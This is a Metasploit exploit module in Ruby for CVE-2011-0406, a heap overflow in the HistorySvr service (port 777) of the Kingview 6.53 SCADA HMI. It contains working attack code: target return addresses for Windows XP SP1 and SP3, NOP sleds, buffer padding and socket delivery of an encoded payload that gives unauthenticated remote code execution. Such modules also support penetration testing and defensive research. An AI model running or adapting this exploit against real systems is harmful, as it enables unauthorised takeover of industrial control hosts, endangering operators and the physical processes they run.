# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => "Kingview 6.53 SCADA HMI HistorySvr Heap Overflow",
            &#039;Description&#039; => %q{
                This module exploits a buffer overflow in Kingview 6.53.  By sending a specially
                crafted request to port 777 (HistorySvr.exe), a remote attacker may be able to
                gain arbitrary code execution without authentication.
            },
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Version&#039;     => "$Revision$",
            &#039;Author&#039;      =>
                [
                    &#039;Dillon Beresford&#039;,  #Found by Dillon
                    &#039;rick2600&#039;,          #XP SP3 execution
                ],
            &#039;References&#039; =>
                [
                    [&#039;CVE&#039;, &#039;2011-0406&#039;],
                    [&#039;OSVDB&#039;, &#039;70366&#039;],
                    [&#039;Bugtraq&#039;, &#039;45727&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/15957&#039;],
                    [&#039;URL&#039;, &#039;http://www.kb.cert.org/vuls/id/180119&#039;],
                    [&#039;URL&#039;, &#039;http://thesauceofutterpwnage.blogspot.com/2011/01/waking-up-sleeping-dragon.html&#039;],
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;BadChars&#039; => "\x00\x0d\x0a\xff"
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;    =>
                [
                    [ &#039;Windows XP SP1&#039;, {&#039;Ret&#039; => 0x77ED73B4} ], #UnhandledExceptionFilter() in kernel32.dll
                    [ &#039;Windows XP SP3 EN&#039;, {&#039;Ret&#039; => 0x00A1FB84} ],
                ],
            &#039;DisclosureDate&#039; => "9/28/2010",
            &#039;DefaultTarget&#039; => 0))
 
            register_options( [ Opt::RPORT(777) ], self.class )
    end
 
    def exploit
        sploit = &#039;&#039;
        if target.name =~ /XP SP1/
 
            sploit << make_nops(32812)
            sploit << "\xEB\x10"
            sploit << "\x41"*6
            sploit << "\xAD\xBB\xC3\x77"
            sploit << [target.ret].pack(&#039;V&#039;)
            sploit << make_nops(8)
            sploit << payload.encoded
            sploit << "\x44"*(1000-payload.encoded.length)
            #this makes the app more crashy, need to investigatev
            #sploit << make_nops(1000-payload.encoded.length)
 
        elsif target.name =~ /XP SP3/
 
            sploit << make_nops(1024)
            sploit << payload.encoded
            sploit << "\x44"*(31752-payload.encoded.length)
            #rand_text_alpha_xxx() unfortunately makes it a bit unstable,
            #not ready to implement
            #sploit << rand_text_alpha_upper(32776-sploit.length)
            sploit << [target.ret].pack(&#039;V&#039;)
 
        end
 
        connect
 
        print_status("Trying target #{target.name}")
        sock.write(sploit)
 
        select(nil, nil, nil, 5)
        handler
        disconnect
 
    end
end



